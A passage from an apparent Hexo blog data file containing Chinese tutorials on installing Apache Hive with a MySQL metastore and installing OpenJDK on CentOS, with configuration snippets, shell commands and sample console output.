class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;!-- 数据库地址 --&gt;</span><br><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">    &lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt;</span><br><span class=\"line\">    &lt;value&gt;jdbc:mysql://localhost:3306/hive&lt;/value&gt;</span><br><span class=\"line\">    &lt;description&gt;JDBC connect string for a JDBC metastore&lt;/description&gt;</span><br><span class=\"line\">&lt;/property&gt;</span><br><span class=\"line\"> &lt;!-- 数据库连接驱动 --&gt;</span><br><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">   &lt;name&gt;javax.jdo.option.ConnectionDriverName&lt;/name&gt;</span><br><span class=\"line\">   &lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt;</span><br><span class=\"line\">   &lt;description&gt;Driver class name for a JDBC metastore&lt;/description&gt;</span><br><span class=\"line\">&lt;/property&gt;</span><br><span class=\"line\"> &lt;!-- 数据库名字--&gt;</span><br><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">   &lt;name&gt;javax.jdo.option.ConnectionUserName&lt;/name&gt;</span><br><span class=\"line\">   &lt;value&gt;hive&lt;/value&gt;</span><br><span class=\"line\">   &lt;description&gt;Username to use against metastore database&lt;/description&gt;</span><br><span class=\"line\">&lt;/property&gt;</span><br><span class=\"line\"> &lt;!-- 数据库密码 --&gt;</span><br><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">   &lt;name&gt;javax.jdo.option.ConnectionPassword&lt;/name&gt;</span><br><span class=\"line\">   &lt;value&gt;000000&lt;/value&gt;</span><br><span class=\"line\">   &lt;description&gt;password to use against metastore database&lt;/description&gt;</span><br><span class=\"line\">&lt;/property&gt;</span><br><span class=\"line\"> &lt;!-- 下面--四个---的配置都是临时存储目录，自己新建然后填上绝对路径--&gt;</span><br><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">    &lt;name&gt;hive.exec.local.scratchdir&lt;/name&gt;</span><br><span class=\"line\">    &lt;value&gt;/usr/Hadoop/hive/iotmp&lt;/value&gt;</span><br><span class=\"line\">    &lt;description&gt;Local scratch space for Hive jobs&lt;/description&gt;</span><br><span class=\"line\">  &lt;/property&gt;</span><br><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">    &lt;name&gt;hive.downloaded.resources.dir&lt;/name&gt;</span><br><span class=\"line\">    &lt;value&gt;/usr/Hadoop/hive/iotmp&lt;/value&gt;</span><br><span class=\"line\">    &lt;description&gt;Temporary local directory for added resources in the remote file system.&lt;/description&gt;</span><br><span class=\"line\">&lt;/property&gt;</span><br><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">    &lt;name&gt;hive.server2.logging.operation.log.location&lt;/name&gt;</span><br><span class=\"line\">    &lt;value&gt;/usr/Hadoop/hive/iotmp&lt;/value&gt;</span><br><span class=\"line\">    &lt;description&gt;Top level directory where operation logs are stored if logging functionality is enabled&lt;/description&gt;</span><br><span class=\"line\">&lt;/property&gt;</span><br><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">    &lt;name&gt;hive.querylog.location&lt;/name&gt;</span><br><span class=\"line\">    &lt;value&gt;/usr/Hadoop/hive/iotmp&lt;/value&gt;</span><br><span class=\"line\">    &lt;description&gt;Location of Hive run time structured log file&lt;/description&gt;</span><br><span class=\"line\">&lt;/property&gt;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><h5 id=\"配置hive-env-sh\"><a href=\"#配置hive-env-sh\" class=\"headerlink\" title=\"配置hive-env.sh\"></a>配置hive-env.sh</h5>hive-env也要从模板复制过去然后修改。</li>\n</ul>\n<p>赋值之后打开，要修改的内容被注释掉了可以打开注释修改也可以直接在末尾添加内容。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp hive-env.sh.template hive-env.sh    #复制</span><br><span class=\"line\">vim hive-env  #打开</span><br><span class=\"line\">#在末尾添加下面内容</span><br><span class=\"line\"></span><br><span class=\"line\"># Hadoop的目录</span><br><span class=\"line\">HADOOP_HOME=/usr/hadoop</span><br><span class=\"line\"></span><br><span class=\"line\"># hive的配置文件目录</span><br><span class=\"line\">export HIVE_CONF_DIR=/usr/hive/conf</span><br><span class=\"line\"></span><br><span class=\"line\">：wq #保存退出</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><h5 id=\"新建元数据sechme（这个单词还不知道怎么翻译）\"><a href=\"#新建元数据sechme（这个单词还不知道怎么翻译）\" class=\"headerlink\" title=\"新建元数据sechme（这个单词还不知道怎么翻译）\"></a>新建元数据sechme（这个单词还不知道怎么翻译）</h5><p>切换到hive的bin目录下，然后新建元数据sechme.<br>这里名字要和mysql对应</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /usr/hive/bin</span><br><span class=\"line\">#新建</span><br><span class=\"line\">./schematool -initSchema -dbType mysql</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"启动hive\"><a href=\"#启动hive\" class=\"headerlink\" title=\"启动hive\"></a>启动hive</h4><p>启动Hadoop<br>启动MySQL<br>启动hive<br>在控制台输入hive<br>出现下面输出</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Logging initialized using configuration in jar:file:/usr/Hadoop/hive/hive/lib/hive-common-2.0.1.jar!/hive-log4j2.properties</span><br><span class=\"line\">Hive-on-MR is deprecated in Hive 2 and may not be available in the future versions. Consider using a different execution engine (i.e. tez, spark) or using Hive 1.X releases.</span><br><span class=\"line\">hive&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>然后输入show tables;不报错就是安装好了。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hive&gt; show tables;</span><br><span class=\"line\">OK</span><br><span class=\"line\">Time taken: 2.42 seconds</span><br><span class=\"line\">hive&gt;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h4 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h4><blockquote>\n<p>CentOS6.5</p>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<p>jdk1.8</p>\n</blockquote>\n<blockquote>\n<p>MySQL5.6</p>\n</blockquote>\n<blockquote>\n<p>Hadoop2.7</p>\n</blockquote>\n<p>mysql要用原生的若果是centOS会自带MariaDB，不要用。</p>\n<p><a href=\"\">CentOS上MySQL安装</a></p>\n<ul>\n<li><h4 id=\"安装hive\"><a href=\"#安装hive\" class=\"headerlink\" title=\"安装hive\"></a>安装hive</h4>下载hive压缩包</li>\n</ul>\n<p>解压</p>\n<p>然后放到一个单独的目录下（不放也行）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget url</span><br><span class=\"line\">tar -zxvf   apache-hive-2.2-bin.tar.gz</span><br><span class=\"line\">mv apache-hive-2.2-bin hive</span><br></pre></td></tr></table></figure>\n<p>不用编译，然后配置就好了</p>\n<ul>\n<li><h4 id=\"配置hive\"><a href=\"#配置hive\" class=\"headerlink\" title=\"配置hive\"></a>配置hive</h4></li>\n<li><h5 id=\"环境变量\"><a href=\"#环境变量\" class=\"headerlink\" title=\"环境变量\"></a>环境变量</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/profile</span><br><span class=\"line\">#在最后加上下面内容，第一行是hive的绝对路径</span><br><span class=\"line\">export HIVE_HOME=/usr/hive</span><br><span class=\"line\">export PATH=$HIVE_HOME/bin:$HIVE_HOME/conf:$PATH</span><br><span class=\"line\">#编辑好后保存</span><br><span class=\"line\">：wq</span><br><span class=\"line\">#保存环境变量</span><br><span class=\"line\">source /etc/profile</span><br></pre></td></tr></table></figure>\n</li>\n<li><h5 id=\"MySQL\"><a href=\"#MySQL\" class=\"headerlink\" title=\"MySQL\"></a>MySQL</h5><p>这里假装MySQL已经装好了</p>\n</li>\n</ul>\n<p>新建一个用户hive,密码为000000。然后新建库hive，这些配置在hive-site.xml中会用到。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -u root -p #进入MySQL</span><br><span class=\"line\">#配置如下</span><br><span class=\"line\">CREATE USER &apos;hive&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;000000&apos;;</span><br><span class=\"line\">grant all privileges on *.* to &apos;hive&apos;@&apos;localhost&apos; identified by &apos;hive&apos;;</span><br><span class=\"line\">flush privileges;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><h5 id=\"配置驱动程序\"><a href=\"#配置驱动程序\" class=\"headerlink\" title=\"配置驱动程序\"></a>配置驱动程序</h5><p>需要把MySQL驱动的jar包下载下来然后放到hive的lib目录下。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://dev.mysql.com/get/Downloads/Connector-J/mysql-connector-java-5.1.39.tar.gz</span><br><span class=\"line\">tar -zxvf mysql-connector-java-5.1.39.tar.gz # 解压</span><br><span class=\"line\">cp mysql-connector-java-5.1.39/mysql-connector-java-5.1.39-bin.jar /usr/hive/lib</span><br></pre></td></tr></table></figure>\n</li>\n<li><h5 id=\"配置hive-site-xml\"><a href=\"#配置hive-site-xml\" class=\"headerlink\" title=\"配置hive-site.xml\"></a>配置hive-site.xml</h5></li>\n</ul>\n<p>到hive的安装目录。目录里是没有hive-site.xml的，但是有模板，把模板复制到hive-site.xml中。然后进行编辑。</p>\n<p>模板中内容很多，但是需要改的地方只有几个。所以需要查找内容再修改。最好把文件下载到本地改好再放回。</p>\n<p>在修改之前要先建一个临时文件目录，配置的时候会用到。这里是</p>\n<blockquote>\n<p>mkdir /usr/Hadoop/hive/iotmp</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd conf   #切换到配置目录下</span><br><span class=\"line\">cp hive-default.xml.template hive-site.xml    #复制一份</span><br><span class=\"line\">vim hive-site.xml     #修改</span><br></pre></td></tr></table></figure>\n<p>需要修改的地方如下（修改的内容在文件中不是连续的，要找全）：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;!-- 数据库地址 --&gt;</span><br><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">    &lt;name&gt;javax.jdo.option.ConnectionURL&lt;/name&gt;</span><br><span class=\"line\">    &lt;value&gt;jdbc:mysql://localhost:3306/hive&lt;/value&gt;</span><br><span class=\"line\">    &lt;description&gt;JDBC connect string for a JDBC metastore&lt;/description&gt;</span><br><span class=\"line\">&lt;/property&gt;</span><br><span class=\"line\"> &lt;!-- 数据库连接驱动 --&gt;</span><br><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">   &lt;name&gt;javax.jdo.option.ConnectionDriverName&lt;/name&gt;</span><br><span class=\"line\">   &lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt;</span><br><span class=\"line\">   &lt;description&gt;Driver class name for a JDBC metastore&lt;/description&gt;</span><br><span class=\"line\">&lt;/property&gt;</span><br><span class=\"line\"> &lt;!-- 数据库名字--&gt;</span><br><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">   &lt;name&gt;javax.jdo.option.ConnectionUserName&lt;/name&gt;</span><br><span class=\"line\">   &lt;value&gt;hive&lt;/value&gt;</span><br><span class=\"line\">   &lt;description&gt;Username to use against metastore database&lt;/description&gt;</span><br><span class=\"line\">&lt;/property&gt;</span><br><span class=\"line\"> &lt;!-- 数据库密码 --&gt;</span><br><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">   &lt;name&gt;javax.jdo.option.ConnectionPassword&lt;/name&gt;</span><br><span class=\"line\">   &lt;value&gt;000000&lt;/value&gt;</span><br><span class=\"line\">   &lt;description&gt;password to use against metastore database&lt;/description&gt;</span><br><span class=\"line\">&lt;/property&gt;</span><br><span class=\"line\"> &lt;!-- 下面--四个---的配置都是临时存储目录，自己新建然后填上绝对路径--&gt;</span><br><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">    &lt;name&gt;hive.exec.local.scratchdir&lt;/name&gt;</span><br><span class=\"line\">    &lt;value&gt;/usr/Hadoop/hive/iotmp&lt;/value&gt;</span><br><span class=\"line\">    &lt;description&gt;Local scratch space for Hive jobs&lt;/description&gt;</span><br><span class=\"line\">  &lt;/property&gt;</span><br><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">    &lt;name&gt;hive.downloaded.resources.dir&lt;/name&gt;</span><br><span class=\"line\">    &lt;value&gt;/usr/Hadoop/hive/iotmp&lt;/value&gt;</span><br><span class=\"line\">    &lt;description&gt;Temporary local directory for added resources in the remote file system.&lt;/description&gt;</span><br><span class=\"line\">&lt;/property&gt;</span><br><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">    &lt;name&gt;hive.server2.logging.operation.log.location&lt;/name&gt;</span><br><span class=\"line\">    &lt;value&gt;/usr/Hadoop/hive/iotmp&lt;/value&gt;</span><br><span class=\"line\">    &lt;description&gt;Top level directory where operation logs are stored if logging functionality is enabled&lt;/description&gt;</span><br><span class=\"line\">&lt;/property&gt;</span><br><span class=\"line\">&lt;property&gt;</span><br><span class=\"line\">    &lt;name&gt;hive.querylog.location&lt;/name&gt;</span><br><span class=\"line\">    &lt;value&gt;/usr/Hadoop/hive/iotmp&lt;/value&gt;</span><br><span class=\"line\">    &lt;description&gt;Location of Hive run time structured log file&lt;/description&gt;</span><br><span class=\"line\">&lt;/property&gt;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><h5 id=\"配置hive-env-sh\"><a href=\"#配置hive-env-sh\" class=\"headerlink\" title=\"配置hive-env.sh\"></a>配置hive-env.sh</h5>hive-env也要从模板复制过去然后修改。</li>\n</ul>\n<p>赋值之后打开，要修改的内容被注释掉了可以打开注释修改也可以直接在末尾添加内容。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp hive-env.sh.template hive-env.sh    #复制</span><br><span class=\"line\">vim hive-env  #打开</span><br><span class=\"line\">#在末尾添加下面内容</span><br><span class=\"line\"></span><br><span class=\"line\"># Hadoop的目录</span><br><span class=\"line\">HADOOP_HOME=/usr/hadoop</span><br><span class=\"line\"></span><br><span class=\"line\"># hive的配置文件目录</span><br><span class=\"line\">export HIVE_CONF_DIR=/usr/hive/conf</span><br><span class=\"line\"></span><br><span class=\"line\">：wq #保存退出</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><h5 id=\"新建元数据sechme（这个单词还不知道怎么翻译）\"><a href=\"#新建元数据sechme（这个单词还不知道怎么翻译）\" class=\"headerlink\" title=\"新建元数据sechme（这个单词还不知道怎么翻译）\"></a>新建元数据sechme（这个单词还不知道怎么翻译）</h5><p>切换到hive的bin目录下，然后新建元数据sechme.<br>这里名字要和mysql对应</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /usr/hive/bin</span><br><span class=\"line\">#新建</span><br><span class=\"line\">./schematool -initSchema -dbType mysql</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"启动hive\"><a href=\"#启动hive\" class=\"headerlink\" title=\"启动hive\"></a>启动hive</h4><p>启动Hadoop<br>启动MySQL<br>启动hive<br>在控制台输入hive<br>出现下面输出</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Logging initialized using configuration in jar:file:/usr/Hadoop/hive/hive/lib/hive-common-2.0.1.jar!/hive-log4j2.properties</span><br><span class=\"line\">Hive-on-MR is deprecated in Hive 2 and may not be available in the future versions. Consider using a different execution engine (i.e. tez, spark) or using Hive 1.X releases.</span><br><span class=\"line\">hive&gt;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>然后输入show tables;不报错就是安装好了。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hive&gt; show tables;</span><br><span class=\"line\">OK</span><br><span class=\"line\">Time taken: 2.42 seconds</span><br><span class=\"line\">hive&gt;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"安装JDK","date":"2018-07-10T13:09:19.000Z","_content":"```\nyum search java|grep jdk\n\nava-1.6.0-openjdk.x86_64 : OpenJDK Runtime Environment \njava-1.6.0-openjdk-demo.x86_64 : OpenJDK Demos \njava-1.6.0-openjdk-devel.x86_64 : OpenJDK Development Environment \njava-1.6.0-openjdk-javadoc.x86_64 : OpenJDK API Documentation \njava-1.6.0-openjdk-src.x86_64 : OpenJDK Source Bundle \njava-1.7.0-openjdk.x86_64 : OpenJDK Runtime Environment \njava-1.7.0-openjdk-demo.x86_64 : OpenJDK Demos \njava-1.7.0-openjdk-devel.x86_64 : OpenJDK Development Environment \njava-1.7.0-openjdk-javadoc.noarch : OpenJDK API Documentation \njava-1.7.0-openjdk-src.x86_64 : OpenJDK Source Bundle \njava-1.8.0-openjdk.x86_64 : OpenJDK Runtime Environme\n...\n\nyum install java-1.7.0-openjdk\nLoaded plugins: fastestmirror\nLoading mirror speeds from cached hostfile\n * base: mirror.metrocast.net\n * epel: epel.mirror.constant.com\n * extras: mirror.metrocast.net\n * updates: mirror.metrocast.net\nResolving Dependencies\n--> Running transaction check\n---> Package java-1.7.0-openjdk.x86_64 1:1.7.0.141-2.6.10.1.el7_3 will be installed\n--> Processing Dependency: java-1.7.0-openjdk-headless = 1:1.7.0.141-2.6.10.1.el7_3 for package: 1:java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64\n--> Processing Dependency: xorg-x11-fonts-Type1 for package: 1:java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64\n--> Processing Dependency: libpulse.so.0(PULSE_0)(64bit) for package: 1:java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64\n--> Processing Dependency: libpng15.so.15(PNG15_0)(64bit) for package: 1:java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64\n```\n安装完之后，默认的安装目录是在: /usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64 \n```\nvi /etc/profile \n\n#set java environment\nJAVA_HOME=/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64\nJRE_HOME=$JAVA_HOME/jre\nCLASS_PATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib\nPATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin\nexport JAVA_HOME JRE_HOME CLASS_PATH PATH \n\nsource /etc/profile \n\njava -versiob\n```","source":"_posts/Linux/安装JDK.md","raw":"---\ntitle: 安装JDK\ndate: 2018-07-10 21:09:19\ntags: Linux\n---\n```\nyum search java|grep jdk\n\nava-1.6.0-openjdk.x86_64 : OpenJDK Runtime Environment \njava-1.6.0-openjdk-demo.x86_64 : OpenJDK Demos \njava-1.6.0-openjdk-devel.x86_64 : OpenJDK Development Environment \njava-1.6.0-openjdk-javadoc.x86_64 : OpenJDK API Documentation \njava-1.6.0-openjdk-src.x86_64 : OpenJDK Source Bundle \njava-1.7.0-openjdk.x86_64 : OpenJDK Runtime Environment \njava-1.7.0-openjdk-demo.x86_64 : OpenJDK Demos \njava-1.7.0-openjdk-devel.x86_64 : OpenJDK Development Environment \njava-1.7.0-openjdk-javadoc.noarch : OpenJDK API Documentation \njava-1.7.0-openjdk-src.x86_64 : OpenJDK Source Bundle \njava-1.8.0-openjdk.x86_64 : OpenJDK Runtime Environme\n...\n\nyum install java-1.7.0-openjdk\nLoaded plugins: fastestmirror\nLoading mirror speeds from cached hostfile\n * base: mirror.metrocast.net\n * epel: epel.mirror.constant.com\n * extras: mirror.metrocast.net\n * updates: mirror.metrocast.net\nResolving Dependencies\n--> Running transaction check\n---> Package java-1.7.0-openjdk.x86_64 1:1.7.0.141-2.6.10.1.el7_3 will be installed\n--> Processing Dependency: java-1.7.0-openjdk-headless = 1:1.7.0.141-2.6.10.1.el7_3 for package: 1:java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64\n--> Processing Dependency: xorg-x11-fonts-Type1 for package: 1:java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64\n--> Processing Dependency: libpulse.so.0(PULSE_0)(64bit) for package: 1:java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64\n--> Processing Dependency: libpng15.so.15(PNG15_0)(64bit) for package: 1:java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64\n```\n安装完之后，默认的安装目录是在: /usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64 \n```\nvi /etc/profile \n\n#set java environment\nJAVA_HOME=/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64\nJRE_HOME=$JAVA_HOME/jre\nCLASS_PATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib\nPATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin\nexport JAVA_HOME JRE_HOME CLASS_PATH PATH \n\nsource /etc/profile \n\njava -versiob\n```","slug":"Linux/安装JDK","published":1,"updated":"2018-07-10T13:10:09.940Z","_id":"cjjedmhap00500gtj2gjca17n","comments":1,"layout":"post","photos":[],"link":"","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum search java|grep jdk</span><br><span class=\"line\"></span><br><span class=\"line\">ava-1.6.0-openjdk.x86_64 : OpenJDK Runtime Environment </span><br><span class=\"line\">java-1.6.0-openjdk-demo.x86_64 : OpenJDK Demos </span><br><span class=\"line\">java-1.6.0-openjdk-devel.x86_64 : OpenJDK Development Environment </span><br><span class=\"line\">java-1.6.0-openjdk-javadoc.x86_64 : OpenJDK API Documentation </span><br><span class=\"line\">java-1.6.0-openjdk-src.x86_64 : OpenJDK Source Bundle </span><br><span class=\"line\">java-1.7.0-openjdk.x86_64 : OpenJDK Runtime Environment </span><br><span class=\"line\">java-1.7.0-openjdk-demo.x86_64 : OpenJDK Demos </span><br><span class=\"line\">java-1.7.0-openjdk-devel.x86_64 : OpenJDK Development Environment </span><br><span class=\"line\">java-1.7.0-openjdk-javadoc.noarch : OpenJDK API Documentation </span><br><span class=\"line\">java-1.7.0-openjdk-src.x86_64 : OpenJDK Source Bundle </span><br><span class=\"line\">java-1.8.0-openjdk.x86_64 : OpenJDK Runtime Environme</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">yum install java-1.7.0-openjdk</span><br><span class=\"line\">Loaded plugins: fastestmirror</span><br><span class=\"line\">Loading mirror speeds from cached hostfile</span><br><span class=\"line\"> * base: mirror.metrocast.net</span><br><span class=\"line\"> * epel: epel.mirror.constant.com</span><br><span class=\"line\"> * extras: mirror.metrocast.net</span><br><span class=\"line\"> * updates: mirror.metrocast.net</span><br><span class=\"line\">Resolving Dependencies</span><br><span class=\"line\">--&gt; Running transaction check</span><br><span class=\"line\">---&gt; Package java-1.7.0-openjdk.x86_64 1:1.7.0.141-2.6.10.1.el7_3 will be installed</span><br><span class=\"line\">--&gt; Processing Dependency: java-1.7.0-openjdk-headless = 1:1.7.0.141-2.6.10.1.el7_3 for package: 1:java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64</span><br><span class=\"line\">--&gt; Processing Dependency: xorg-x11-fonts-Type1 for package: 1:java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64</span><br><span class=\"line\">--&gt; Processing Dependency: libpulse.so.0(PULSE_0)(64bit) for package: 1:java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64</span><br><span class=\"line\">--&gt; Processing Dependency: libpng15.so.15(PNG15_0)(64bit) for package: 1:java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64</span><br></pre></td></tr></table></figure>\n<p>安装完之后，默认的安装目录是在: /usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span 